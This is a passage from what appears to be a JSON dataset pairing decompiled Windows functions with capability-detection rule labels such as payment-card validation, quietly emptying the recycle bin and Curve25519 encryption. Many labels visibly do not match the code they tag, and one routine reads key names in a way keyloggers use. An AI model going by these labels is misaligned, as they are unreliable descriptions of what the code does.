        "decompiled_code": "\nvoid fcn.00444ca4(void)\n\n{\n    uint8_t uVar1;\n    uint *in_FS_OFFSET;\n    bool bVar2;\n    uint uStack16;\n    uint uStack12;\n    uchar *puStack8;\n    \n    puStack8 = &stack0xfffffffc;\n    uStack12 = 0x444d2a;\n    uStack16 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack16;\n    bVar2 = *0x463b18 == 0;\n    *0x463b18 = *0x463b18 + -1;\n    if (bVar2) {\n        uVar1 = sub.kernel32.dll_GetVersion_1();\n        *0x463b14 = 3 < uVar1;\n        fcn.00444a70();\n        fcn.004133a0();\n        fcn.00413440();\n        fcn.004133ec();\n        fcn.004133ec();\n        fcn.004133ec();\n    }\n    *in_FS_OFFSET = uStack16;\n    return;\n}\n",
        "token_count": 234
    },
    "0044e20c": {
        "rules": [
            "calculate modulo 256 via x86 assembly"
        ],
        "decompiled_code": "\nvoid fcn.0044e20c(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    \n    fcn.00403fa8();\n    iVar3 = 1;\n    iVar1 = fcn.00404268();\n    if (0 < iVar1) {\n        do {\n            uVar2 = *(in_EAX + -1 + iVar3);\n            if ((*(*0x4621f4 + (uVar2 >> 3)) >> (uVar2 & 7) & 1) == 0) {\n                if (((*(in_EAX + -1 + iVar3) == '&') && (0 < iVar1 - iVar3)) &&\n                   (iVar3 = iVar3 + 1,  *(in_EAX + -1 + iVar3) != '&')) {\n                    fcn.00404190();\n                }\n            }\n            else {\n                iVar3 = iVar3 + 1;\n            }\n            iVar3 = iVar3 + 1;\n        } while (iVar3 <= iVar1);\n    }\n    return;\n}\n",
        "token_count": 244
    },
    "00402b70": {
        "rules": [
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf",
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8"
        ],
        "decompiled_code": "\nulong __fastcall fcn.00402b70(uint param_1, uint8_t *param_2)\n\n{\n    uint8_t *in_EAX;\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    int32_t *piVar4;\n    int32_t *piVar5;\n    \n    uVar2 = *param_2;\n    piVar4 = in_EAX + 1;\n    piVar5 = param_2 + 1;\n    iVar1 = *in_EAX - uVar2;\n    if (*in_EAX < uVar2 || iVar1 == 0) {\n        uVar2 = uVar2 + iVar1;\n    }\n    uVar3 = uVar2 >> 2;\n    do {\n        if (uVar3 == 0) {\ncode_r0x00402bb3:\n            uVar3 = uVar2 & 3;\n            uVar2 = uVar3;\n            if ((uVar3 == 0) ||\n               ((*piVar4 == *piVar5 &&\n                ((uVar2 = uVar3 - 1,  uVar2 == 0 ||\n                 ((*(piVar4 + 1) == *(piVar5 + 1) &&\n                  ((uVar2 = uVar3 - 2,  uVar2 == 0 || (*(piVar4 + 2) == *(piVar5 + 2))))))))))) {\n                iVar1 = iVar1 * 2;\n            }\ncode_r0x00402bee:\n            return CONCAT44(uVar2, iVar1);\n        }\n        if (*piVar4 != *piVar5) goto code_r0x00402bee;\n        if (uVar3 == 1) {\n            piVar4 = piVar4 + 1;\n            piVar5 = piVar5 + 1;\n            goto code_r0x00402bb3;\n        }\n        if (piVar4[1] != piVar5[1]) goto code_r0x00402bee;\n        piVar4 = piVar4 + 2;\n        piVar5 = piVar5 + 2;\n        uVar3 = uVar3 - 2;\n    } while( true );\n}\n",
        "token_count": 485
    },
    "00402bf4": {
        "rules": [
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf",
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8"
        ],
        "decompiled_code": "\nint32_t * __fastcall fcn.00402bf4(uint32_t param_1, int32_t *param_2)\n\n{\n    int32_t *in_EAX;\n    uint32_t uVar1;\n    \n    uVar1 = param_1 >> 2;\n    do {\n        if (uVar1 == 0) {\ncode_r0x00402c24:\n            param_1 = param_1 & 3;\n            if (((param_1 != 0) && (*in_EAX == *param_2)) &&\n               ((param_1 == 1 ||\n                ((*(in_EAX + 1) == *(param_2 + 1) && ((param_1 == 2 || (*(in_EAX + 2) == *(param_2 + 2))))))))) {\n                return NULL;\n            }\n            return in_EAX;\n        }\n        if (*in_EAX != *param_2) {\n            return in_EAX;\n        }\n        if (uVar1 == 1) {\n            in_EAX = in_EAX + 1;\n            param_2 = param_2 + 1;\n            goto code_r0x00402c24;\n        }\n        if (in_EAX[1] != param_2[1]) {\n            return in_EAX;\n        }\n        in_EAX = in_EAX + 2;\n        param_2 = param_2 + 2;\n        uVar1 = uVar1 - 2;\n    } while( true );\n}\n",
        "token_count": 325
    },
    "00403264": {
        "rules": [
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf",
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00403299)\n// WARNING: Removing unreachable block (ram,0x0040329f)\n// WARNING: Removing unreachable block (ram,0x004032a6)\n// WARNING: Removing unreachable block (ram,0x004032ac)\n// WARNING: Removing unreachable block (ram,0x004032b2)\n\nvoid __fastcall fcn.00403264(uint param_1, int32_t *param_2)\n\n{\n    int32_t in_EAX;\n    uint32_t uVar1;\n    uint32_t uVar2;\n    int32_t *piVar3;\n    \n    *param_2 = in_EAX;\n    uVar2 = *(in_EAX + -0x28);\n    uVar1 = uVar2 >> 2;\n    piVar3 = param_2 + 1;\n    while (uVar1 = uVar1 - 1,  uVar1 != 0) {\n        *piVar3 = 0;\n        piVar3 = piVar3 + 1;\n    }\n    for (uVar2 = uVar2 & 3; uVar2 != 0; uVar2 = uVar2 - 1) {\n        *piVar3 = 0;\n        piVar3 = piVar3 + 1;\n    }\n    for (; *(in_EAX + -0x24) != NULL; in_EAX = **(in_EAX + -0x24)) {\n    }\n    return;\n}\n",
        "token_count": 325
    },
    "004043b4": {
        "rules": [
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf",
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004043b4(uint param_1, int32_t *param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    uint32_t uVar2;\n    \n    if (((in_EAX != param_2) && (in_EAX != NULL)) && (param_2 != NULL)) {\n        uVar2 = param_2[-1];\n        iVar1 = in_EAX[-1] - uVar2;\n        if (in_EAX[-1] < uVar2 || iVar1 == 0) {\n            uVar2 = uVar2 + iVar1;\n        }\n        uVar2 = uVar2 >> 2;\n        for (; ((uVar2 != 0 && (*in_EAX == *param_2)) && ((uVar2 != 1 && (in_EAX[1] == param_2[1]))));\n            in_EAX = in_EAX + 2) {\n            param_2 = param_2 + 2;\n            uVar2 = uVar2 - 2;\n        }\n    }\n    return;\n}\n",
        "token_count": 241
    },
    "00404800": {
        "rules": [
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf",
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00404800(uint param_1, int32_t *param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    uint32_t uVar2;\n    \n    if (((in_EAX != param_2) && (in_EAX != NULL)) && (param_2 != NULL)) {\n        uVar2 = param_2[-1];\n        iVar1 = in_EAX[-1] - uVar2;\n        if (in_EAX[-1] < uVar2 || iVar1 == 0) {\n            uVar2 = uVar2 + iVar1;\n        }\n        uVar2 = uVar2 >> 2;\n        for (; ((uVar2 != 0 && (*in_EAX == *param_2)) && ((uVar2 != 1 && (in_EAX[1] == param_2[1]))));\n            in_EAX = in_EAX + 2) {\n            param_2 = param_2 + 2;\n            uVar2 = uVar2 - 2;\n        }\n    }\n    return;\n}\n",
        "token_count": 240
    },
    "00408618": {
        "rules": [
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf",
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00408618(uint param_1, uint *param_2)\n\n{\n    char cVar1;\n    uint *in_EAX;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint *puVar4;\n    \n    uVar2 = 0xffffffff;\n    puVar4 = param_2;\n    do {\n        if (uVar2 == 0) break;\n        uVar2 = uVar2 - 1;\n        cVar1 = *puVar4;\n        puVar4 = puVar4 + 1;\n    } while (cVar1 != '\\0');\n    for (uVar3 = ~uVar2 >> 2; uVar3 != 0; uVar3 = uVar3 - 1) {\n        *in_EAX = *param_2;\n        param_2 = param_2 + 1;\n        in_EAX = in_EAX + 1;\n    }\n    for (uVar2 = ~uVar2 & 3; uVar2 != 0; uVar2 = uVar2 - 1) {\n        *in_EAX = *param_2;\n        param_2 = param_2 + 1;\n        in_EAX = in_EAX + 1;\n    }\n    return;\n}\n",
        "token_count": 283
    },
    "00408640": {
        "rules": [
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf",
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00408640(int32_t param_1, uint *param_2)\n\n{\n    uint *in_EAX;\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint *puVar3;\n    bool bVar4;\n    \n    bVar4 = param_1 == 0;\n    iVar1 = param_1;\n    puVar3 = param_2;\n    if (!bVar4) {\n        do {\n            if (iVar1 == 0) break;\n            iVar1 = iVar1 + -1;\n            bVar4 = *puVar3 == '\\0';\n            puVar3 = puVar3 + 1;\n        } while (!bVar4);\n        if (bVar4) {\n            iVar1 = iVar1 + 1;\n        }\n    }\n    for (uVar2 = param_1 - iVar1 >> 2; uVar2 != 0; uVar2 = uVar2 - 1) {\n        *in_EAX = *param_2;\n        param_2 = param_2 + 1;\n        in_EAX = in_EAX + 1;\n    }\n    for (uVar2 = param_1 - iVar1 & 3; uVar2 != 0; uVar2 = uVar2 - 1) {\n        *in_EAX = *param_2;\n        param_2 = param_2 + 1;\n        in_EAX = in_EAX + 1;\n    }\n    *in_EAX = 0;\n    return;\n}\n",
        "token_count": 335
    },
    "00416db0": {
        "rules": [
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf",
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00416db0(uint32_t param_1, uint *param_2)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint *puVar4;\n    \n    while (param_1 != 0) {\n        uVar2 = *(in_EAX + 0x14) - *(in_EAX + 0x10);\n        if (*(in_EAX + 0x14) < *(in_EAX + 0x10) || uVar2 == 0) {\n            fcn.00416dfc();\n            uVar2 = *(in_EAX + 0x14);\n        }\n        if (param_1 <= uVar2) {\n            uVar2 = param_1;\n        }\n        param_1 = param_1 - uVar2;\n        iVar1 = *(in_EAX + 0x10);\n        *(in_EAX + 0x10) = *(in_EAX + 0x10) + uVar2;\n        puVar4 = *(in_EAX + 8) + iVar1;\n        for (uVar3 = uVar2 >> 2; uVar3 != 0; uVar3 = uVar3 - 1) {\n            *param_2 = *puVar4;\n            puVar4 = puVar4 + 1;\n            param_2 = param_2 + 1;\n        }\n        for (uVar2 = uVar2 & 3; uVar2 != 0; uVar2 = uVar2 - 1) {\n            *param_2 = *puVar4;\n            puVar4 = puVar4 + 1;\n            param_2 = param_2 + 1;\n        }\n    }\n    return;\n}\n",
        "token_count": 399
    },
    "0041910c": {
        "rules": [
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf",
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041910c(uint32_t param_1, uint *param_2)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint *puVar4;\n    \n    while (param_1 != 0) {\n        uVar2 = *(in_EAX + 0xc) - *(in_EAX + 0x10);\n        if (*(in_EAX + 0xc) < *(in_EAX + 0x10) || uVar2 == 0) {\n            fcn.00419158();\n            uVar2 = *(in_EAX + 0xc);\n        }\n        if (param_1 <= uVar2) {\n            uVar2 = param_1;\n        }\n        param_1 = param_1 - uVar2;\n        iVar1 = *(in_EAX + 0x10);\n        *(in_EAX + 0x10) = *(in_EAX + 0x10) + uVar2;\n        puVar4 = *(in_EAX + 8) + iVar1;\n        for (uVar3 = uVar2 >> 2; uVar3 != 0; uVar3 = uVar3 - 1) {\n            *puVar4 = *param_2;\n            param_2 = param_2 + 1;\n            puVar4 = puVar4 + 1;\n        }\n        for (uVar2 = uVar2 & 3; uVar2 != 0; uVar2 = uVar2 - 1) {\n            *puVar4 = *param_2;\n            param_2 = param_2 + 1;\n            puVar4 = puVar4 + 1;\n        }\n    }\n    return;\n}\n",
        "token_count": 395
    },
    "00407a70": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00407a70(ushort *arg_8h)\n\n{\n    uint32_t in_EAX;\n    ushort *in_ECX;\n    uint32_t in_EDX;\n    \n    *in_ECX = in_EAX / (in_EDX & 0xffff);\n    *arg_8h = in_EAX % (in_EDX & 0xffff);\n    return;\n}\n",
        "token_count": 87
    },
    "00402c64": {
        "rules": [
            "compute adler32 checksum/59ba9d7991e641c88d7c729645f1cfca"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00402c64(uchar param_1, uint32_t param_2)\n\n{\n    uint *in_EAX;\n    int32_t iVar1;\n    \n    iVar1 = param_2 >> 2;\n    if (-1 < iVar1) {\n        for (; iVar1 != 0; iVar1 = iVar1 + -1) {\n            *in_EAX = CONCAT22(CONCAT11(param_1, param_1), CONCAT11(param_1, param_1));\n            in_EAX = in_EAX + 1;\n        }\n        for (param_2 = param_2 & 3; param_2 != 0; param_2 = param_2 - 1) {\n            *in_EAX = param_1;\n            in_EAX = in_EAX + 1;\n        }\n    }\n    return;\n}\n",
        "token_count": 185
    },
    "004068fc": {
        "rules": [
            "compute adler32 checksum/59ba9d7991e641c88d7c729645f1cfca"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.004068fc(uint param_1, int32_t param_2)\n\n{\n    uint32_t in_EAX;\n    \n    return in_EAX & 0xffff | param_2 << 0x10;\n}\n",
        "token_count": 54
    },
    "00448de8": {
        "rules": [
            "compute adler32 checksum/59ba9d7991e641c88d7c729645f1cfca"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_2h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00448de8(void)\n\n{\n    uchar in_AL;\n    int32_t iVar1;\n    uint lpString;\n    uint var_2h;\n    \n    var_2h._0_1_ = in_AL;\n    fcn.00403fa8();\n    iVar1 = sub.user32.dll_MapVirtualKeyA(var_2h, 0);\n    if (iVar1 << 0x10 != 0) {\n        sub.user32.dll_GetKeyNameTextA(iVar1 << 0x10, &lpString, 0x100);\n        fcn.00404218();\n    }\n    return;\n}\n",
        "token_count": 162
    },
    "00402c84": {
        "rules": [
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00402c84(uint param_1, int32_t *param_2)\n\n{\n    bool bVar1;\n    uint8_t *in_EAX;\n    uint32_t uVar2;\n    uint8_t uVar3;\n    uint8_t uVar4;\n    uint8_t *puVar5;\n    uint8_t *puVar6;\n    int32_t iVar7;\n    \n    puVar6 = in_EAX;\n    if (in_EAX == NULL) {\ncode_r0x00402cfa:\n        puVar6 = puVar6 + 1;\n    }\n    else {\n        uVar2 = 0;\n        do {\n            puVar5 = puVar6;\n            uVar3 = *puVar5;\n            puVar6 = puVar5 + 1;\n        } while (uVar3 == 0x20);\n        bVar1 = false;\n        if (uVar3 == 0x2d) {\n            bVar1 = true;\ncode_r0x00402d0a:\n            uVar3 = *puVar6;\n            puVar6 = puVar5 + 2;\n        }\n        else if (uVar3 == 0x2b) goto code_r0x00402d0a;\n        if (((uVar3 == 0x24) || (uVar3 == 0x78)) || (uVar3 == 0x58)) {\ncode_r0x00402d0f:\n            uVar3 = *puVar6;\n            puVar6 = puVar6 + 1;\n            if (uVar3 != 0) {\n                do {\n                    if (0x60 < uVar3) {\n                        uVar3 = uVar3 - 0x20;\n                    }\n                    uVar4 = uVar3 - 0x30;\n                    if (9 < uVar4) {\n                        if (5 < uVar3 + 0xbf) goto code_r0x00402d03;\n                        uVar4 = uVar3 - 0x37;\n                    }\n                    if (0xfffffff < uVar2) goto code_r0x00402d03;\n                    uVar2 = uVar2 * 0x10 + uVar4;\n                    uVar3 = *puVar6;\n                    puVar6 = puVar6 + 1;\n                } while (uVar3 != 0);\ncode_r0x00402d4c:\n                iVar7 = 0;\n                goto code_r0x00402d4f;\n            }\n            goto code_r0x00402cfa;\n        }\n        if (uVar3 != 0x30) {\n            if (uVar3 != 0) goto code_r0x00402cd6;\n            goto code_r0x00402d03;\n        }\n        uVar3 = *puVar6;\n        puVar6 = puVar6 + 1;\n        if ((uVar3 == 0x78) || (uVar3 == 0x58)) goto code_r0x00402d0f;\n        while (uVar3 != 0) {\ncode_r0x00402cd6:\n            if ((9 < uVar3 - 0x30) || (0xccccccc < uVar2)) goto code_r0x00402d03;\n            uVar2 = uVar2 * 10 + (uVar3 - 0x30);\n            uVar3 = *puVar6;\n            puVar6 = puVar6 + 1;\n        }\n        if (bVar1) {\n            if ((-1 < uVar2) || (0 < uVar2)) goto code_r0x00402d4c;\n        }\n        else if (-1 < uVar2) goto code_r0x00402d4c;\n    }\ncode_r0x00402d03:\n    iVar7 = puVar6 - in_EAX;\ncode_r0x00402d4f:\n    *param_2 = iVar7;\n    return;\n}\n",
        "token_count": 874
    },
    "0040a49c": {
        "rules": [
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0040a49c(char *arg_8h)\n\n{\n    uint16_t uVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t *in_ECX;\n    int32_t *in_EDX;\n    int32_t iVar3;\n    uint var_8h;\n    uint var_4h;\n    \n    *arg_8h = '\\0';\n    fcn.0040a478();\n    iVar3 = *in_EDX;\n    uVar1 = 0;\n    while( true ) {\n        iVar2 = fcn.00404268();\n        if (((iVar2 < iVar3) || (9 < *(in_EAX + -1 + iVar3) - 0x30U)) || (999 < uVar1)) break;\n        uVar1 = uVar1 * 10 + (*(in_EAX + -1 + iVar3) - 0x30);\n        iVar3 = iVar3 + 1;\n    }\n    iVar2 = *in_EDX;\n    if (iVar2 < iVar3) {\n        *arg_8h = iVar3 - *in_EDX;\n        *in_EDX = iVar3;\n        *in_ECX = uVar1;\n        in_EDX = in_ECX;\n    }\n    return in_EDX & 0xffffff00 | iVar2 < iVar3;\n}\n",
        "token_count": 302
    },
    "00416e38": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ddd7fbc99e2542de97c80e37351c10a7/bde1572c33fb4ad4a176b04786e84c23",
            "validate payment card number using luhn algorithm with no lookup table/73780005e39049dabd818a965d665a12"
        ],
        "decompiled_code": "\nuint32_t fcn.00416e38(void)\n\n{\n    uint32_t uVar1;\n    \n    uVar1 = fcn.004187ec();\n    return uVar1 & 0xffffff00 | uVar1 == '\\t';\n}\n",
        "token_count": 54
    },
    "004239f8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ddd7fbc99e2542de97c80e37351c10a7/bde1572c33fb4ad4a176b04786e84c23",
            "validate payment card number using luhn algorithm with no lookup table/73780005e39049dabd818a965d665a12"
        ],
        "decompiled_code": "\nint32_t * fcn.004239f8(void)\n\n{\n    uint arg_ch;\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    int32_t *in_FS_OFFSET;\n    uint *arg_8h;\n    int32_t iStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint var_18h;\n    int32_t *var_8h;\n    uint var_4h;\n    \n    puStack44 = 0x423a12;\n    var_8h = fcn.00421984();\n    uStack48 = 0x423ad7;\n    iStack52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffcc;\n    puStack44 = &stack0xfffffffc;\n    (**(*var_8h + 0x40))();\n    (**(*var_8h + 0x34))();\n    fcn.00421f4c();\n    fcn.0041d1d8();\n    fcn.0041d0bc();\n    arg_ch = (**(*var_8h + 0x20))();\n    arg_8h = &fcn.004239f8::var_18h;\n    (**(*var_8h + 0x2c))();\n    fcn.00412730(arg_8h, arg_ch);\n    fcn.0041d460();\n    uVar4 = 0;\n    do {\n        uVar3 = 0;\n        do {\n            uVar1 = uVar4 & 0x80000001;\n            if (uVar1 < 0) {\n                uVar1 = (uVar1 - 1 | 0xfffffffe) + 1;\n            }\n            uVar2 = uVar3 & 0x80000001;\n            if (uVar2 < 0) {\n                uVar2 = (uVar2 - 1 | 0xfffffffe) + 1;\n            }\n            if (uVar1 == uVar2) {\n                fcn.0041d7bc(var_4h);\n            }\n            uVar3 = uVar3 + 1;\n        } while (uVar3 != 9);\n        uVar4 = uVar4 + 1;\n    } while (uVar4 != 9);\n    fcn.00421c08();\n    *in_FS_OFFSET = arg_8h;\n    return var_8h;\n}\n",
        "token_count": 545
    },
    "004176e0": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\nfloat10 fcn.004176e0(void)\n\n{\n    int64_t iVar1;\n    char cVar2;\n    int32_t in_EAX;\n    float10 fStack24;\n    \n    cVar2 = fcn.004187ec();\n    if (cVar2 == '\\x05') {\n        fcn.00416db0();\n    }\n    else {\n        *(in_EAX + 0x10) = *(in_EAX + 0x10) + -1;\n        iVar1 = fcn.00417968();\n        fStack24 = iVar1;\n    }\n    return fStack24;\n}\n",
        "token_count": 134
    },
    "0043a4d4": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\nulong __fastcall fcn.0043a4d4(uint *param_1, uint *param_2)\n\n{\n    uint8_t uVar1;\n    uint uVar2;\n    uint uVar3;\n    int32_t *in_EAX;\n    uint uVar4;\n    ulong uVar5;\n    \n    if (*(in_EAX + 0x5b) == '\\x05') {\n        uVar4 = CONCAT31(in_EAX >> 8, 1);\n    }\n    else {\n        uVar2 = *param_2;\n        uVar3 = *param_1;\n        uVar5 = (**(*in_EAX + 0x34))();\n        uVar4 = uVar5;\n        uVar1 = *(in_EAX + 0x5b);\n        if ((uVar1 == 0) || (uVar1 - 3 < 2)) {\n            *param_2 = uVar2;\n        }\n        param_2 = uVar5 >> 0x20 & 0xffffff00 | uVar1 - 3;\n        if (uVar1 < 3) {\n            *param_1 = uVar3;\n            param_2 = param_1;\n        }\n    }\n    return CONCAT44(param_2, uVar4);\n}\n",
        "token_count": 279
    },
    "00402d9c": {
        "rules": [
            "decompress data using LZO/b26d4b886bd545b48ed63f32c6357c17"
        ],
        "decompiled_code": "\nvoid fcn.00402d9c(void)\n\n{\n    return;\n}\n",
        "token_count": 17
    },
    "00403090": {
        "rules": [
            "empty recycle bin quietly/a05fef7955a340fbb66225983c77e1df"
        ],
        "decompiled_code": "\nuint fcn.00403090(void)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint uVar3;\n    \n    uVar3 = 0;\n    iVar1 = sub.user32.dll_GetKeyboardType(0);\n    if (iVar1 == 7) {\n        uVar2 = sub.user32.dll_GetKeyboardType(1);\n        if (((uVar2 & 0xff00) == 0xd00) || ((uVar2 & 0xff00) == 0x400)) {\n            uVar3 = 1;\n        }\n    }\n    return uVar3;\n}\n",
        "token_count": 135
    },
    "0040352c": {
        "rules": [
            "empty recycle bin quietly/a05fef7955a340fbb66225983c77e1df"
        ],
        "decompiled_code": "\nulong __fastcall fcn.0040352c(uint param_1, uint8_t *param_2)\n\n{\n    uint16_t *puVar1;\n    int32_t *in_EAX;\n    int32_t *piVar2;\n    uint32_t uVar3;\n    uint8_t uVar4;\n    int32_t *piVar5;\n    uint32_t uVar6;\n    \n    uVar3 = 0;\n    uVar6 = 0;\n    uVar4 = *param_2;\n    piVar2 = in_EAX;\n    do {\n        puVar1 = *(*piVar2 + -0x38);\n        if (puVar1 != NULL) {\n            uVar6 = uVar6 & 0xffff0000 | *puVar1;\n            piVar5 = puVar1 + 3;\n            do {\n                uVar3 = uVar3 & 0xffffff00 | *(piVar5 + 6);\n                if (*(piVar5 + 6) == uVar4) {\n                    while (((*(uVar3 + 6 + piVar5) ^ param_2[uVar3]) & 0xdf) == 0) {\n                        uVar3 = uVar3 - 1;\n                        if (uVar3 == 0) {\n                            piVar2 = *piVar5 + in_EAX;\n                            goto code_r0x00403578;\n                        }\n                    }\n                    uVar4 = *param_2;\n                    uVar3 = uVar3 & 0xffffff00 | *(piVar5 + 6);\n                }\n                piVar5 = uVar3 + 7 + piVar5;\n                uVar6 = uVar6 - 1;\n            } while (uVar6 != 0);\n        }\n        piVar2 = *(*piVar2 + -0x24);\n    } while (piVar2 != NULL);\ncode_r0x00403578:\n    return CONCAT44(in_EAX, piVar2);\n}\n",
        "token_count": 427
    },
    "0040af8c": {
        "rules": [
            "empty recycle bin quietly/a05fef7955a340fbb66225983c77e1df"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040af8c(uint arg_8h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_4h;\n    \n    puStack20 = &stack0xfffffffc;\n    uStack24 = 0x40aff1;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    for (iVar2 = 1; *(iVar2 * 4 + 0x463768) != -1; iVar2 = iVar2 + 1) {\n        if (iVar2 == 7) goto code_r0x0040afdb;\n    }\n    fcn.004041a0();\n    uVar1 = fcn.00407fc8();\n    *(iVar2 * 4 + 0x463768) = uVar1;\ncode_r0x0040afdb:\n    *in_FS_OFFSET = uStack28;\n    puStack20 = 0x40aff8;\n    uStack24 = 0x40aff0;\n    fcn.00403fa8();\n    return;\n}\n",
        "token_count": 266
    },
    "004030c0": {
        "rules": [
            "encrypt data using Curve25519/ee72fa54c57a4f96b956b5431c8943ad",
            "encrypt data using Curve25519/ee72fa54c57a4f96b956b5431c8943ad"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.004030c0(void)\n\n{\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint uVar2;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint uStack36;\n    uint uStack32;\n    uint uStack28;\n    uint uStack24;\n    uint *puStack20;\n    uint var_ch;\n    uint32_t var_8h;\n    uint hKey;\n    \n    var_8h = *0x461020;\n    puStack20 = &fcn.004030c0::hKey;\n    uStack24 = 1;\n    uStack28 = 0;\n    uStack32 = 0x403158;\n    uStack36 = 0x80000002;\n    puStack40 = 0x4030e7;\n    iVar1 = sub.advapi32.dll_RegOpenKeyExA();\n    if (iVar1 == 0) {\n        uStack44 = 0x403131;\n        uStack48 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffd0;\n        var_ch = 4;\n        uVar2 = hKey;\n        puStack40 = &stack0xfffffffc;\n        sub.advapi32.dll_RegQueryValueExA(hKey, 0x403174, 0, 0, &fcn.004030c0::var_8h, &fcn.004030c0::var_ch);\n        *in_FS_OFFSET = uVar2;\n        sub.advapi32.dll_RegCloseKey(hKey, 0x403138);\n        return;\n    }\n    *0x461020 = *0x461020 & 0xffc0 | var_8h & 0x3f;\n    return;\n}\n",
        "token_count": 394
    },
    "00403c08": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid fcn.00403c08(void)\n\n{\n    int32_t **ppiVar1;\n    int32_t **in_FS_OFFSET;\n    \n    if (*0x463638 != NULL) {\n        ppiVar1 = *in_FS_OFFSET;\n        if (*0x463638 == ppiVar1) {\n            *in_FS_OFFSET = **0x463638;\n            return;\n        }\n        for (; ppiVar1 != 0xffffffff; ppiVar1 = *ppiVar1) {\n            if (*ppiVar1 == *0x463638) {\n                *ppiVar1 = **0x463638;\n                return;\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 146
    },
    "00405d34": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid fcn.00405d34(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.00405d2c();\n    if (iVar1 != 0) {\n        if (*0x46109c == -1) {\n            fcn.00403f9c();\n        }\n        iVar1 = fcn.00405d20();\n        if (iVar1 == 0) {\n            fcn.00403f9c();\n        }\n        else {\n            sub.kernel32.dll_TlsSetValue(*0x46109c, iVar1);\n        }\n    }\n    return;\n}\n",
        "token_count": 131
    },
    "004083b4": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
